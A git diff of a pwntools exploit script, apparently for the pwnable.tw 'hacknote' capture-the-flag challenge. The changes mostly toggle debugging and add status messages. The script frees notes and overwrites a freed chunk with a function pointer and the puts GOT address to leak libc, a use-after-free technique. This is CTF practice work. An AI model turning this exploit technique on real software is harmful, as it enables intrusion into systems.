@@ -1,7 +1,7 @@
 #/usr/local/bin python2
 #coding:utf-8
 from pwn import *
-con=remote("chall.pwnable.tw", 10102)
+#con=remote("chall.pwnable.tw", 10102)
 con=process("./hacknote")
 e=ELF("./hacknote")
 elib=ELF("./hacknote_libc_32.so.6")
@@ -15,6 +15,7 @@ def addNote(size,content):
     con.sendline(str(size))
     con.recvuntil("Content :")
     con.sendline(content)
+    print("Add succeed!")
 def deleteNote(index):
 
     con.recvuntil("choice :")
@@ -24,6 +25,7 @@ def deleteNote(index):
     con.recvuntil("Index :")
 
     con.sendline(str(index))
+    print("Delete Succeed!")
 
 def printNote(index):
 
@@ -43,17 +45,16 @@ gdb.attach(con)
 
 addNote(24,24*"a")
 
-gdb.attach(con)
 
 deleteNote(0)
 
-gdb.init(con)
 
 deleteNote(1)
 
+gdb.attach(con)
+
 addNote(8,p32(printn)+p32(puts_got))
 
-gdb.attach(con)
 
 printNote(0)
 
